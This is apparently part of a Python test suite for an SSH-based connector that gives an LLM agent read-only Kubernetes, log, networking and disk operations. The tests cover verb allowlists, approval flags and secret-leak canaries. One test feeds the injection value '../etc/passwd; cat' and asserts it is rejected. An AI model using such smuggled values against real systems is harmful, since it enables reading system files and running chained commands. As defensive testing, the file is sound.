    k8s_op = next(op for op in READ_OPS if op.op_id == "holodeck.k8s.exec")
    schema = k8s_op.parameter_schema
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.validate({"command": command}, schema)


@pytest.mark.parametrize(
    "verb",
    [
        "get",
        "describe",
        "logs",
        "top",
        "explain",
        "api-resources",
        "api-versions",
        "cluster-info",
        "version",
    ],
)
@pytest.mark.asyncio
async def test_k8s_exec_handler_accepts_every_safelist_verb(verb: str) -> None:
    """Allowlist regression guard -- the tightened metachar/regex pair must
    not break any verb on :data:`_K8S_READ_VERBS`.

    Sibling to ``test_k8s_exec_schema_pattern_accepts_read_verbs``;
    this one drives the **handler** path end-to-end with a mocked
    SSH transport so the parser + metachar scan + verb-safelist
    sequence is exercised together.
    """
    connector = HolodeckConnector()
    # The ``cluster-info`` / ``version`` verbs take no positional arg
    # so call them naked; everything else accepts ``pods`` as a
    # placeholder resource name.
    command = f"kubectl {verb}" if verb in {"cluster-info", "version"} else (f"kubectl {verb} pods")
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="(ok)\n")
        result = await connector.k8s_exec(_TARGET, {"command": command})
    mock_cmd.assert_awaited_once()
    assert result["exit_status"] == 0
    # No error envelope -- the safelist verb passed both safety
    # checks and the SSH path was reached.
    assert "error" not in result or result.get("error") is None


# ---------------------------------------------------------------------------
# Bound-method shims -- logs_tail
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_logs_tail_runs_tail_with_default_lines() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="log line a\nlog line b\n")
        result = await connector.logs_tail(_TARGET, {"component": "dhcp"})
    cmd = mock_cmd.await_args.args[1]
    assert cmd == "tail -n 200 /holodeck-runtime/logs/dhcp*.log"
    assert result["lines_requested"] == 200
    assert "log line a" in result["raw"]


@pytest.mark.asyncio
async def test_logs_tail_runs_tail_with_explicit_lines() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="...")
        await connector.logs_tail(_TARGET, {"component": "dns", "lines": 50})
    cmd = mock_cmd.await_args.args[1]
    assert cmd == "tail -n 50 /holodeck-runtime/logs/dns*.log"


@pytest.mark.asyncio
async def test_logs_tail_rejects_component_with_shell_metacharacters() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.logs_tail(_TARGET, {"component": "../etc/passwd; cat"})
        mock_cmd.assert_not_awaited()
    assert "error" in result


@pytest.mark.asyncio
async def test_logs_tail_rejects_empty_component() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.logs_tail(_TARGET, {"component": ""})
        mock_cmd.assert_not_awaited()
    assert "error" in result


@pytest.mark.asyncio
async def test_logs_tail_rejects_out_of_range_lines() -> None:
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        result = await connector.logs_tail(_TARGET, {"component": "dhcp", "lines": 0})
        mock_cmd.assert_not_awaited()
    assert "error" in result


@pytest.mark.asyncio
async def test_logs_tail_parses_multi_file_output() -> None:
    connector = HolodeckConnector()
    output = (
        "==> /holodeck-runtime/logs/frr.log <==\n"
        "frr peer up\n"
        "==> /holodeck-runtime/logs/frr-bgp.log <==\n"
        "bgp peer up\n"
    )
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout=output)
        result = await connector.logs_tail(_TARGET, {"component": "frr"})
    assert len(result["files"]) == 2


# ---------------------------------------------------------------------------
# Bound-method shims -- networking_show
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_networking_show_composes_four_sub_sections() -> None:
    connector = HolodeckConnector()
    # The handler runs four sub-commands; mock side_effect emits a
    # different stdout per call. Order: vtysh bgp, vtysh routes,
    # pwsh dns, cat dhcp.
    import json as _stdlib_json

    dns_json = _stdlib_json.dumps([{"ZoneName": "lab.test", "ZoneType": "Primary"}])
    sequence = [
        _proc(stdout="BGP summary text\n"),
        _proc(stdout="Routes text\n"),
        _proc(stdout=dns_json),
        _proc(stdout="lease 10.0.0.1\n"),
    ]
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = sequence
        result = await connector.networking_show(_TARGET, {})
    assert result["bgp"]["ok"] is True
    assert result["routes"]["ok"] is True
    assert result["dns"]["ok"] is True
    assert result["dns"]["total"] == 1
    assert result["dhcp"]["ok"] is True


@pytest.mark.asyncio
async def test_networking_show_isolates_sub_command_failures() -> None:
    """One failing sub-command must not blank the others -- each has its own ok flag."""
    connector = HolodeckConnector()
    sequence = [
        _proc(stdout="BGP fine\n"),
        OSError("vtysh missing"),  # routes path fails
        # DNS pwsh fails too (non-zero exit).
        _proc(stdout="", stderr="dns pwsh broke", exit_status=1),
        _proc(stdout="leases ok\n"),
    ]
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = sequence
        result = await connector.networking_show(_TARGET, {})
    assert result["bgp"]["ok"] is True
    assert result["routes"]["ok"] is False
    assert result["dns"]["ok"] is False
    assert result["dhcp"]["ok"] is True


# ---------------------------------------------------------------------------
# parse_disk_usage_output (G3.18-T1 #2153)
# ---------------------------------------------------------------------------


_DF_ROOT_OK = (
    "Filesystem     1B-blocks         Used    Available Use% Mounted on\n"
    "/dev/md2    467909804032  58598952960 385467109376  14% /\n"
)


def test_parse_disk_usage_root_fs_byte_counts_and_percent() -> None:
    payload = parse_disk_usage_output(
        df_root_text=_DF_ROOT_OK,
        dir_usages=[
            ("/var/backups", "40000000000\t/var/backups\n"),
            ("/holodeck-runtime", "12345\t/holodeck-runtime\n"),
        ],
    )
    root = payload["root_fs"]
    assert root["ok"] is True
    assert root["total_bytes"] == 467909804032
    assert root["used_bytes"] == 58598952960
    assert root["avail_bytes"] == 385467109376
    # percent computed off the byte counts, not df's rounded Use%.
    assert root["percent_used"] == round((58598952960 / 467909804032) * 100.0, 2)


def test_parse_disk_usage_growth_dirs_carry_used_bytes_and_ok() -> None:
    payload = parse_disk_usage_output(
        df_root_text=_DF_ROOT_OK,
        dir_usages=[
            ("/var/backups", "40000000000\t/var/backups\n"),
            ("/holodeck-runtime", "12345\t/holodeck-runtime\n"),
        ],
    )
    dirs = {d["path"]: d for d in payload["growth_dirs"]}
    assert dirs["/var/backups"]["used_bytes"] == 40000000000
    assert dirs["/var/backups"]["ok"] is True
    assert dirs["/holodeck-runtime"]["used_bytes"] == 12345
    assert dirs["/holodeck-runtime"]["ok"] is True
    # Order + count mirror the input tuple.
    assert [d["path"] for d in payload["growth_dirs"]] == [
        "/var/backups",
        "/holodeck-runtime",
    ]


def test_parse_disk_usage_failed_du_does_not_blank_the_others() -> None:
    """A single empty du output flips only that entry's ok -- isolation contract."""
    payload = parse_disk_usage_output(
        df_root_text=_DF_ROOT_OK,
        dir_usages=[
            ("/var/backups", ""),  # du failed (missing dir / SSH error)
            ("/holodeck-runtime", "12345\t/holodeck-runtime\n"),
        ],
    )
    assert payload["root_fs"]["ok"] is True
    dirs = {d["path"]: d for d in payload["growth_dirs"]}
    assert dirs["/var/backups"]["ok"] is False
    assert dirs["/var/backups"]["used_bytes"] is None
    assert dirs["/holodeck-runtime"]["ok"] is True
    assert dirs["/holodeck-runtime"]["used_bytes"] == 12345


def test_parse_disk_usage_empty_df_flips_root_ok_false() -> None:
    payload = parse_disk_usage_output(
        df_root_text="",
        dir_usages=[("/var/backups", "40000000000\t/var/backups\n")],
    )
    root = payload["root_fs"]
    assert root["ok"] is False
    assert root["total_bytes"] is None
    assert root["percent_used"] is None
    # Growth dir still resolves independently.
    assert payload["growth_dirs"][0]["ok"] is True


def test_parse_disk_usage_non_numeric_du_flips_entry_false() -> None:
    payload = parse_disk_usage_output(
        df_root_text=_DF_ROOT_OK,
        dir_usages=[("/var/backups", "du: cannot access '/var/backups'\n")],
    )
    entry = payload["growth_dirs"][0]
    assert entry["ok"] is False
    assert entry["used_bytes"] is None


# ---------------------------------------------------------------------------
# Bound-method shim -- disk_usage (G3.18-T1 #2153)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_disk_usage_reports_root_fs_and_growth_dirs() -> None:
    connector = HolodeckConnector()
    # Sub-command order: df -B1 /, then du -sb per GROWTH_DIRS entry.
    sequence = [
        _proc(stdout=_DF_ROOT_OK),
        _proc(stdout="40000000000\t/var/backups\n"),
        _proc(stdout="12345\t/holodeck-runtime\n"),
    ]
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = sequence
        result = await connector.disk_usage(_TARGET, {})
    assert result["root_fs"]["ok"] is True
    assert result["root_fs"]["total_bytes"] == 467909804032
    dirs = {d["path"]: d for d in result["growth_dirs"]}
    assert set(dirs) == set(GROWTH_DIRS)
    assert dirs["/var/backups"]["used_bytes"] == 40000000000
    assert dirs["/holodeck-runtime"]["used_bytes"] == 12345


@pytest.mark.asyncio
async def test_disk_usage_runs_df_and_du_no_path_param() -> None:
    """The op issues df on / and du on the fixed GROWTH_DIRS -- no operator path."""
    connector = HolodeckConnector()
    sequence = [
        _proc(stdout=_DF_ROOT_OK),
        _proc(stdout="40000000000\t/var/backups\n"),
        _proc(stdout="12345\t/holodeck-runtime\n"),
    ]
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = sequence
        # Extra params must be ignored -- there is no path parameter.
        await connector.disk_usage(_TARGET, {"path": "/etc"})
    issued = [call.args[1] for call in mock_cmd.await_args_list]
    assert issued[0] == "df -B1 /"
    assert issued[1] == "du -sb /var/backups"
    assert issued[2] == "du -sb /holodeck-runtime"
    # /etc (operator input) never reaches a command.
    assert not any("/etc" in cmd for cmd in issued)


@pytest.mark.asyncio
async def test_disk_usage_isolates_failed_sub_command() -> None:
    connector = HolodeckConnector()
    sequence = [
        _proc(stdout=_DF_ROOT_OK),
        OSError("du: no such dir"),  # /var/backups du fails
        _proc(stdout="12345\t/holodeck-runtime\n"),
    ]
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.side_effect = sequence
        result = await connector.disk_usage(_TARGET, {})
    assert result["root_fs"]["ok"] is True
    dirs = {d["path"]: d for d in result["growth_dirs"]}
    assert dirs["/var/backups"]["ok"] is False
    assert dirs["/holodeck-runtime"]["ok"] is True


def test_disk_usage_op_is_safe_read_only_no_path_param() -> None:
    """AC: safe / no-approval / read-only tag / empty param schema (no path)."""
    op = next(o for o in HOLODECK_OPS if o.op_id == "holodeck.disk.usage")
    assert op.safety_level == "safe"
    assert op.requires_approval is False
    assert "read-only" in op.tags
    assert op.parameter_schema.get("additionalProperties") is False
    assert op.parameter_schema.get("properties") == {}


def test_disk_usage_growth_dirs_are_the_expected_constant() -> None:
    assert GROWTH_DIRS == ("/var/backups", "/holodeck-runtime")


# ---------------------------------------------------------------------------
# HOLODECK_OPS registration shape
# ---------------------------------------------------------------------------


#: The 9 read-op ids (T1 canary + 7 T2 reads + G3.18-T1 disk.usage).
#: The G3.18-T2 (#2154) approval-gated write ops are asserted
#: separately in ``test_connectors_holodeck_write.py``.
_READ_OP_IDS: frozenset[str] = frozenset(
    {
        "holodeck.about",
        "holodeck.config.show",
        "holodeck.pod.list",
        "holodeck.pod.info",
        "holodeck.service.list",
        "holodeck.k8s.exec",
        "holodeck.logs.tail",
        "holodeck.networking.show",
        "holodeck.disk.usage",
    }
)


def test_holodeck_ops_has_twelve_entries() -> None:
    """T1 canary (about) + 7 T2 read ops + G3.18-T1 disk.usage + 3 G3.18-T2 write ops = 12 total."""
    assert len(HOLODECK_OPS) == 12


def test_holodeck_ops_about_remains_at_index_zero() -> None:
    assert HOLODECK_OPS[0].op_id == "holodeck.about"


def test_holodeck_ops_covers_expected_op_ids() -> None:
    op_ids = {op.op_id for op in HOLODECK_OPS}
    expected = set(_READ_OP_IDS) | {
        "holodeck.k8s.pods.gc",
        "holodeck.backups.prune",
        "holodeck.images.import",
    }
    assert op_ids == expected


def test_holodeck_ops_all_have_holodeck_namespace() -> None:
    for op in HOLODECK_OPS:
        assert op.op_id.startswith("holodeck."), f"{op.op_id!r} lacks holodeck. prefix"


def test_holodeck_read_ops_all_safe() -> None:
    """Every T2 read op is read-only -- safety_level='safe' is mandatory."""
    for op in HOLODECK_OPS:
        if op.op_id not in _READ_OP_IDS:
            continue
        assert op.safety_level == "safe", (
            f"{op.op_id!r} has safety_level={op.safety_level!r}; every read op must be safe"
        )


def test_holodeck_read_ops_all_no_approval_required() -> None:
    for op in HOLODECK_OPS:
        if op.op_id not in _READ_OP_IDS:
            continue
        assert op.requires_approval is False, (
            f"{op.op_id!r} should not require approval -- reads only"
        )


def test_holodeck_ops_all_parameter_schemas_have_additional_properties_false() -> None:
    for op in HOLODECK_OPS:
        assert op.parameter_schema.get("additionalProperties") is False, (
            f"{op.op_id!r} parameter_schema missing additionalProperties=False"
        )


def test_holodeck_ops_all_have_llm_instructions() -> None:
    for op in HOLODECK_OPS:
        assert op.llm_instructions, f"{op.op_id!r} missing llm_instructions"
        when_to_use = op.llm_instructions.get("when_to_use")
        assert when_to_use, f"{op.op_id!r} missing llm_instructions.when_to_use"
        assert isinstance(when_to_use, str) and when_to_use.strip()


def test_holodeck_ops_llm_instructions_mention_ssh_transport() -> None:
    """Every op's ``when_to_use`` must include the SSH-only transport note.

    CLAUDE.md postulate 5 + Initiative #371 require agent-facing
    descriptions to call out the PowerShell-over-SSH transport so an
    LLM doesn't compose against a non-existent REST surface.
    """
    for op in HOLODECK_OPS:
        when_to_use = op.llm_instructions.get("when_to_use", "")
        assert "SSH" in when_to_use or "ssh" in when_to_use, (
            f"{op.op_id!r} when_to_use lacks SSH transport mention"
        )


def test_holodeck_ops_group_keys_include_new_groups() -> None:
    """T2 read groups + G3.18-T1 diagnostics + the G3.18-T2 (#2154) approval-gated write groups."""
    group_keys = {op.group_key for op in HOLODECK_OPS if op.group_key}
    assert {
        "identity",
        "config",
        "pod",
        "service",
        "k8s",
        "logs",
        "networking",
        # G3.18-T1 (#2153) read-op diagnostics group (holodeck.disk.usage).
        "diagnostics",
        # G3.18-T2 (#2154) write groups (``-write`` suffix avoids collision).
        "k8s-write",
        "backups-write",
        "images-write",
    } == group_keys


def test_holodeck_ops_handler_attrs_exist_on_connector() -> None:
    """Every ``handler_attr`` in HOLODECK_OPS resolves to a method on HolodeckConnector."""
    for op in HOLODECK_OPS:
        assert hasattr(HolodeckConnector, op.handler_attr), (
            f"{op.op_id!r}: HolodeckConnector has no attr {op.handler_attr!r}"
        )


def test_holodeck_ops_jsonflux_list_ops_have_rows_and_total_in_response_schema() -> None:
    """JSONFlux precedent: list ops emit ``{rows, total}`` envelopes."""
    for op_id in ("holodeck.pod.list", "holodeck.service.list"):
        op = next(o for o in HOLODECK_OPS if o.op_id == op_id)
        assert op.response_schema is not None
        properties = op.response_schema.get("properties", {})
        assert "rows" in properties, f"{op_id!r} response missing 'rows'"
        assert "total" in properties, f"{op_id!r} response missing 'total'"


# ---------------------------------------------------------------------------
# Secret-leak canary -- no credential bleed into envelopes / logs / repr
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_pod_list_envelope_does_not_leak_target_secret(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """``target.secret_ref`` password/key must not surface anywhere in the envelope or logs."""
    connector = HolodeckConnector()
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout='[{"PodId":"x"}]')
        with caplog.at_level("DEBUG"):
            result = await connector.pod_list(_TARGET, {})
    rendered = _serialise_for_leak_check(result)
    assert _CANARY_PASSWORD not in rendered
    assert _CANARY_SSH_KEY not in rendered
    log_text = caplog.text
    assert _CANARY_PASSWORD not in log_text
    assert _CANARY_SSH_KEY not in log_text


@pytest.mark.asyncio
async def test_config_show_pwsh_error_envelope_does_not_leak_stderr_canary(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """When pwsh fails, the stderr fragment must not carry secret-shaped substrings.

    PwshRunError truncates stderr at 4096 chars but does **not** scrub
    its content. The contract is: callers must not pass secret material
    in the cmd; the connector's handlers never interpolate
    ``target.secret_ref`` fields into pwsh scripts. We assert that
    invariant here.
    """
    connector = HolodeckConnector()
    # The stderr the connector emits cannot contain ``_CANARY_PASSWORD``
    # because the connector never interpolates it into the script body.
    # We assert this by exercising the PwshRunError envelope and
    # confirming the canary is absent.
    stderr_with_noise = "some pwsh failure stderr that does not include the secret"
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="", stderr=stderr_with_noise, exit_status=2)
        with caplog.at_level("DEBUG"):
            result = await connector.config_show(_TARGET, {})
    rendered = _serialise_for_leak_check(result)
    assert _CANARY_PASSWORD not in rendered
    assert _CANARY_SSH_KEY not in rendered
    assert _CANARY_PASSWORD not in caplog.text


@pytest.mark.asyncio
async def test_k8s_exec_envelope_does_not_leak_target_secret() -> None:
    """The k8s.exec envelope must not surface ``target.secret_ref`` data.

    The handler never inlines credential material into the command; we
    assert the invariant under both happy-path and rejection paths.
    """
    connector = HolodeckConnector()
    # Happy path: read-only kubectl.
    with patch.object(connector, "_run_command", new_callable=AsyncMock) as mock_cmd:
        mock_cmd.return_value = _proc(stdout="pod info\n")
        ok_result = await connector.k8s_exec(_TARGET, {"command": "kubectl get pods"})
    # Rejected path: mutating verb.
    with patch.object(connector, "_run_command", new_callable=AsyncMock):
        rejected_result = await connector.k8s_exec(_TARGET, {"command": "kubectl delete pod foo"})
    for result in (ok_result, rejected_result):
        rendered = _serialise_for_leak_check(result)
        assert _CANARY_PASSWORD not in rendered
        assert _CANARY_SSH_KEY not in rendered


@pytest.mark.asyncio
async def test_k8s_exec_envelope_does_not_leak_full_command_on_safety_rejection() -> None:
    """The rejection envelope names the verb but **not** the full command line.

    The full command may contain operator-supplied resource names; we
    keep the operator-visible error surface narrow to the verb token
    so a noisy command body doesn't bleed into structured error
    payloads. The verb itself is part of the audit_log row's hashed
    params anyway.
    """
    connector = HolodeckConnector()
    full_command = "kubectl delete pod sensitive-internal-name-12345"
    result = await connector.k8s_exec(_TARGET, {"command": full_command})
    assert "error" in result
    # The verb is allowed to appear; the resource name should not.
    assert "delete" in result["error"]
    assert "sensitive-internal-name-12345" not in result["error"]


# ---------------------------------------------------------------------------
# Connector method existence (handler_attr -> bound method roundtrip)
# ---------------------------------------------------------------------------


def test_connector_has_all_t2_handler_methods() -> None:
    expected_attrs = (
        "config_show",
        "pod_list",
        "pod_info",
        "service_list",
        "k8s_exec",
        "logs_tail",
        "networking_show",
        "disk_usage",
    )
    for attr in expected_attrs:
        assert callable(getattr(HolodeckConnector, attr, None)), (
            f"HolodeckConnector lacks the T2 handler {attr!r}"
        )
